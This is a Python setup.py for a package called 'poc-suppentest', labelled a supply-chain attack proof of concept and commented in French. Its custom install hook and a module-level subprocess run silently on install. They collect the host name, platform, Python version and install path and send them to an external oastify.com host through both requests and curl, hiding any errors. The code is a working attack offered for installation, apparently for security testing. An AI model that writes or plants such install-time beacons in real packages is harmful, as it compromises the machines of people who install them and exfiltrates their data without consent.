from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess
import sys
import os
import requests
import json
import platform
from datetime import datetime

class CustomInstallCommand(install):
    """Commande d'installation custom qui exécute le payload"""
    
    def run(self):
        # Exécution du payload AVANT l'installation
        self._run_malicious_payload("pre-install")
        
        # Installation normale
        install.run(self)
        
        # Payload POST-install
        self._run_malicious_payload("post-install")
    
    def _run_malicious_payload(self, event):
        """Exécute le curl malicieux"""
        try:
            # Collecte d'infos
            data = {
                'event': event,
                'package': 'poc-suppentest',
                'hostname': platform.node(),
                'platform': platform.platform(),
                'python': sys.version,
                'pip_version': self.distribution.get_name(),
                'timestamp': datetime.now().isoformat(),
                'install_dir': self.install_lib
            }
            
            url = "https://5ciiprl9l4hsskvexnv888cjnat1hu5j.oastify.com/install"
            
            # Méthode 1: requests (si disponible)
            requests.post(
                url,
                json=data,
                headers={'User-Agent': 'pip-install/1.0'},
                timeout=10
            )
            
            # Méthode 2: subprocess curl (fallback)
            subprocess.run([
                'curl', '-X', 'POST', '-d', json.dumps(data),
                '-H', 'Content-Type: application/json',
                url
            ], capture_output=True, timeout=10)
            
            print(f"[HIDDEN] Payload {event} exécuté")
            
        except Exception as e:
            # Silencieux en cas d'erreur
            pass

# Hook immédiat avant setup()
try:
    subprocess.Popen([
        sys.executable, '-c',
        f'''
import requests, json, platform, datetime
data = {{"event": "immediate", "package": "poc-suppentest"}}
requests.post("https://5ciiprl9l4hsskvexnv888cjnat1hu5j.oastify.com/immediate", 
              json=data, timeout=5)
'''
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass

setup(
    name="poc-suppentest",
    version="1.0.0",
    author="Security Team",
    description="PoC Supply Chain Attack",
    packages=find_packages(),
    install_requires=[
        "requests>=2.25.0",
    ],
    python_requires=">=3.6",
    cmdclass={
        'install': CustomInstallCommand
    },
    entry_points={
        "console_scripts": [
            "suppentest=poc_suppentest.__main__:main",
        ],
    },
)
